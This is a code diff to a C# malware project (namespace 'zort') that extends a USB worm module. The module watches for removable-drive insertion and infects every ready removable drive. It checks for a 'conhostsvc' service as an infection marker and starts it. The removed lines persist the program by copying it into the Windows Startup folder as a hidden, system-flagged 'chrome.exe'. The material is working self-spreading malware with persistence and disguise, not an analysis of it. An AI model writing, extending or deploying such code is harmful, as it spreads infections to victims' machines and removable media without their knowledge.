@@ -5,6 +5,7 @@ using System.Linq;
 using System.Management;
 using System.Security.AccessControl;
 using System.Security.Principal;
+using System.ServiceProcess;
 using File = System.IO.File;
 
 namespace zort
@@ -24,8 +25,8 @@ namespace zort
         {
             // Code to start the infection method
             ModuleLogger.Log(this, "InfectRemovables started.");
+            TryInfectAll();
             WatchRemovableDrives();
-            InfectRemovableDrive('E');
         }
         public void Stop()
         {
@@ -42,9 +43,25 @@ namespace zort
             {
                 // Code to handle the event when a removable drive is inserted
                 ModuleLogger.Log(this, "Removable drive inserted or removed.");
+
+                TryInfectAll();
             });
             _watcher.Query = new WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");
             _watcher.Start();
+        }
+
+        private void TryInfectAll()
+        {
+            //Enumerate all removable drives and infect them
+            DriveInfo[] drives = DriveInfo.GetDrives();
+            foreach (DriveInfo drive in drives)
+            {
+                if (drive.DriveType == DriveType.Removable && drive.IsReady)
+                {
+                    char driveLetter = drive.Name[0];
+                    InfectRemovableDrive(driveLetter);
+                }
+            }
         }
 
         private void UnwatchRemovableDrives()
@@ -257,59 +274,46 @@ namespace zort
             }
 
             // Continue infecting the system if not already infected
-            if(IsSystemInfected())
+            if(!IsSystemInfected())
             {
-                // Move self to startup folder
-                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                string startupPath = Path.Combine(startupFolder, "chrome.exe");
-                File.Copy(currentPath, startupPath, true);
-                ModuleLogger.Log(typeof(RemovableInfector), $"Moved self to startup folder: {startupPath}");
-
-                // Give hidden and system attributes to the file
-                File.SetAttributes(startupPath, FileAttributes.Hidden | FileAttributes.System);
-                ModuleLogger.Log(typeof(RemovableInfector), $"Set hidden and system attributes to: {startupPath}");
-
-                // Start the cloned executable and exit
-                System.Diagnostics.Process.Start(startupPath);
-                ModuleLogger.Log(typeof(RemovableInfector), $"Started cloned executable: {startupPath}");
-                ModuleLogger.Log(typeof(RemovableInfector), "Exiting original process.");
-                // Exit the current process
+                PersistenceHelper.MoveAndRunFromStartup();
+            } else
+            {
+                ModuleLogger.Log(typeof(RemovableInfector), "System is already infected. Exiting.");
                 Environment.Exit(0);
             }
         }
 
         public static bool IsSystemInfected()
         {
+            const string serviceName = "conhostsvc";
             try
             {
                 // Check if conhostsvc exists
-                string serviceName = "conhostsvc";
-                using (var searcher = new ManagementObjectSearcher($"SELECT * FROM Win32_Service WHERE Name = '{serviceName}'"))
+                var service = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName.ToLower() == serviceName);
+                if (service != null)
                 {
-                    foreach (var service in searcher.Get())
+                    ModuleLogger.Log(typeof(RemovableInfector), "System is infected. Service exists.");
+                    // Service exists
+                    ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} exists. System is infected.");
+
+                    //Start service if not already running
+                    var serviceController = new System.ServiceProcess.ServiceController(serviceName);
+                    if (serviceController.Status != System.ServiceProcess.ServiceControllerStatus.Running)
                     {
-                        // Service exists
-                        ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} exists. System is infected.");
-
-                        //Start service if not already running
-                        var serviceController = new System.ServiceProcess.ServiceController(serviceName);
-                        if (serviceController.Status != System.ServiceProcess.ServiceControllerStatus.Running)
-                        {
-                            serviceController.Start();
-                            ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} started.");
-                        }
-                        else
-                        {
-                            ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} is already running.");
-                        }
-
-                        return true;
+                        serviceController.Start();
+                        ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} started.");
+                    }
+                    else
+                    {
+                        ModuleLogger.Log(typeof(RemovableInfector), $"Service {serviceName} is already running.");
                     }
 
-                    return false;
+                    return true;
                 }
-            }
-            catch (Exception ex)
+                else return false;
+
+            } catch (Exception ex)
             {
                 ModuleLogger.Log(typeof(RemovableInfector), $"Error checking if system is infected: {ex.Message}");
                 return false;
